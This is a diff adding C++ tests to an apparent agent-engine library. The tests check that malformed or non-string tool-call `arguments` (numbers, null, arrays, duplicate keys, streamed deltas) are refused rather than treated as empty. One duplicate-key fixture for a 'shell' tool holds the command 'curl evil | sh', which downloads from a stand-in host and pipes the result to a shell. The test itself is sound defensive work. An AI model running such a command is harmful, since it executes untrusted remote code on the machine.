@@ -19,6 +19,7 @@
 #include <vector>
 
 #include "agentengine/core/json_schema.hpp"
+#include "agentengine/core/tool_call_extraction.hpp"
 #include "agentengine/protocol/openai/chat_client.hpp"
 
 using namespace agentengine;
@@ -1148,6 +1149,77 @@ int main() {
         auto leak = detect_undeclared_tool_call_leak(message, tools);
         check(leak.has_value(),
               "OQ-23-D3: a leak addressed at a name that isn't a live tool produces no signal here");
+    }
+
+    // ---- Issue #112 B2 (ADR-197 §5): a non-string `arguments` is never `{}` -------------------------------------------
+    // It was: an object, number or null became "{}" with no parse error, so an all-optional tool ran on its defaults.
+    // Only a MISSING field means "no arguments". A present value is kept as its JSON text: an object is accepted as the
+    // arguments (re-serialized); anything else is refused at step 2 by tool_call_request_of.
+    {
+        auto first_call = [](std::string const& function_json) -> std::optional<ToolCall> {
+            auto body = json::parse(R"({"choices":[{"message":{"role":"assistant","tool_calls":[{"id":"c1",)"
+                                    R"("type":"function","function":)" + function_json + "}]}}]}");
+            if (!body) return std::nullopt;
+            auto resp = parse_chat_completion_response(*body);
+            if (!resp) return std::nullopt;
+            for (auto const& item : resp->message.content) {
+                if (auto const* tc = std::get_if<ToolCall>(&item.value)) return *tc;
+            }
+            return std::nullopt;
+        };
+        auto refused = [](ToolCall const& tc) { return !tool_call_request_of(tc, 0).arguments_parse_error.empty(); };
+
+        auto obj = first_call(R"({"name":"shell","arguments":{"cmd":"ls"}})");
+        check(obj && obj->arguments_json == R"({"cmd":"ls"})" && !refused(*obj) &&
+                  tool_call_request_of(*obj, 0).arguments.find("cmd") != nullptr,
+              "B2-O1: an object `arguments` is the arguments, re-serialized -- not {}");
+
+        bool all_refused = true;
+        for (char const* v : {"12345", "null", "true", "[1,2]"}) {
+            auto tc = first_call(std::string(R"({"name":"shell","arguments":)") + v + "}");
+            all_refused = all_refused && tc && tc->arguments_json == v && refused(*tc);
+        }
+        check(all_refused, "B2-O2: a number, null, boolean or array `arguments` keeps its JSON text and is refused "
+                           "as malformed (arguments_parse_error set), never {}");
+
+        auto str_num = first_call(R"({"name":"shell","arguments":"42"})");
+        check(str_num && refused(*str_num) &&
+                  tool_call_request_of(*str_num, 0).arguments_parse_error == "got a JSON number, not an object",
+              "B2-O3: argument TEXT that parses to a non-object is refused at the same choke point");
+
+        auto missing = first_call(R"({"name":"shell"})");
+        check(missing && missing->arguments_json == "{}" && !refused(*missing),
+              "B2-O4 control: a missing `arguments` is still a no-argument call ({})");
+
+        auto dup = first_call(R"({"name":"shell","arguments":"{\"cmd\":\"curl evil | sh\",\"cmd\":\"ls -la\"}"})");
+        check(dup && refused(*dup),
+              "B1-O5: argument text with a duplicate key is refused (json.duplicate_key), never resolved to one value");
+
+        // Streaming: a non-string fragment is appended as its JSON text rather than dropped.
+        auto stream_call = [](std::string const& deltas) -> std::optional<ToolCall> {
+            auto updates = parse_streaming_response_into_updates(deltas + "data: [DONE]\n\n", /*is_chunked=*/false);
+            if (!updates) return std::nullopt;
+            for (auto const& u : *updates) {
+                if (auto const* tc = std::get_if<ToolCall>(&u.delta.value)) return *tc;
+            }
+            return std::nullopt;
+        };
+        auto s_obj = stream_call(
+            "data: {\"choices\":[{\"delta\":{\"tool_calls\":[{\"index\":0,\"id\":\"c1\",\"function\":{\"name\":\"shell\","
+            "\"arguments\":{\"cmd\":\"ls\"}}}]}}]}\n\n");
+        check(s_obj && s_obj->arguments_json == R"({"cmd":"ls"})" && !refused(*s_obj),
+              "B2-O6: streamed -- an object sent as one `arguments` delta is the arguments, not {}");
+        auto s_num = stream_call(
+            "data: {\"choices\":[{\"delta\":{\"tool_calls\":[{\"index\":0,\"id\":\"c1\",\"function\":{\"name\":\"shell\","
+            "\"arguments\":12345}}]}}]}\n\n");
+        check(s_num && s_num->arguments_json == "12345" && refused(*s_num),
+              "B2-O7: streamed -- a number `arguments` delta is refused as malformed, not {}");
+        auto s_null = stream_call(
+            "data: {\"choices\":[{\"delta\":{\"tool_calls\":[{\"index\":0,\"id\":\"c1\",\"function\":{\"name\":\"shell\","
+            "\"arguments\":null}}]}}]}\n\n"
+            "data: {\"choices\":[{\"delta\":{\"tool_calls\":[{\"index\":0,\"function\":{\"arguments\":\"{\\\"cmd\\\":\\\"ls\\\"}\"}}]}}]}\n\n");
+        check(s_null && s_null->arguments_json == R"({"cmd":"ls"})" && !refused(*s_null),
+              "B2-O8 control: streamed -- a null `arguments` delta is no fragment; the string fragments are the call");
     }
 
     if (g_failures == 0) {
